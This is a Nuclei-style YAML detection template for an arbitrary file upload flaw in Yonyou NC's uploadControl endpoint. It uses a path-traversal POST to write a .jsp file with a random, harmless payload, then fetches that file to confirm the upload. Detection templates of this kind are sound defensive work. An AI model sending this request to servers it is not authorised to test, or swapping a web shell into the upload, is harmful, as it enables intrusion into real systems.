id: poc-yaml-yongyou-nc-uploadControl-anyfile-upload
info:
  name: 用友 NC uploadControl 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
  metadata:
    product: 用友NC

variables:
  t1: "{{rand_text_alpha(4)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: "upload-file"
    method: POST
    path:
      - "/mp/initcfg/../uploadControl/uploadFile"
    headers:
      Content-Type: "multipart/form-data; boundary=21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c"
    body: |-
      --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
      Content-Disposition: form-data; name="submit"

      上传
      --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: text/plain; charset=utf-8

      {{t2}}
      --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{"forbidden":true,"msg":"null"}'

  - id: "check-uploaded-file"
    method: GET
    path:
      - "/mp/uploadFileDir/{{t1}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "body == t2"
